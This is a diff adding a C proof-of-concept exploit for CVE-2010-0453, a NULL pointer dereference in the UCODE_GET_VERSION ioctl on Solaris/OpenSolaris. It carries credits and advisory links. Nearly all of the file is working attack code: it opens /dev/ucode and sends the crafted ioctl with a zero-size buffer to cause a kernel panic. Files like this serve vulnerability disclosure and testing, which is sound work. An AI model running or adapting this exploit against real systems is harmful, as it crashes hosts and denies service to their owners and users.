@@ -1,0 +1,79 @@
+/*
+ * cve-2010-0453.c -- Patroklos Argyroudis, argp at domain census-labs.com
+ *
+ * Denial of service (kernel panic) PoC exploit for the UCODE_GET_VERSION
+ * ioctl NULL pointer dereference vulnerability on Solaris/OpenSolaris:
+ *
+ * http://www.trapkit.de/advisories/TKADV2010-001.txt
+ * http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2010-0453
+ *
+ * Greets to Tobias Klein for discovering the vulnerability and for his
+ * detailed (as always) advisory.
+ *
+ * $Id: cve-2010-0453.c,v 35da14215c84 2010/02/07 19:15:13 argp $
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <stropts.h>
+#include <sys/mman.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+
+#define BUF_SIZE            64
+#define UCODE_DEV           "/dev/ucode"
+
+#define UCODE_IOC           (('u' << 24) | ('c' << 16) | ('o' << 8))
+#define UCODE_GET_VERSION   (UCODE_IOC | 0)
+
+typedef enum ucode_errno
+{
+    EM_OK,
+    EM_FILESIZE,
+    EM_OPENFILE,
+    EM_FILEFORMAT,
+    EM_HEADER,
+    EM_CHECKSUM,
+    EM_INVALIDARG,
+    EM_NOMATCH,
+    EM_HIGHERREV,
+    EM_NOTSUP,
+    EM_UPDATE,
+    EM_SYS,
+    EM_NOVENDOR,
+    EM_NOMEM
+} ucode_errno_t;
+
+struct ucode_get_rev_struct
+{
+    uint32_t *ugv_rev;
+    int ugv_size;
+    ucode_errno_t ugv_errno;
+};
+
+int
+main()
+{
+    int fd, ret;
+    uint32_t buf[BUF_SIZE];
+    struct ucode_get_rev_struct in_h;
+
+    memset(buf, 0x41, BUF_SIZE);
+
+    in_h.ugv_rev = buf;
+    in_h.ugv_size = 0;
+
+    fd = open(UCODE_DEV, O_RDONLY);
+    ret = ioctl(fd, UCODE_GET_VERSION, &in_h);
+
+    printf("[+] ret = %d\n", ret);
+    printf("[+] ugv_errno = %d\n", in_h.ugv_errno);
+
+    close(fd);
+    return ret;
+}
+
+/* EOF */
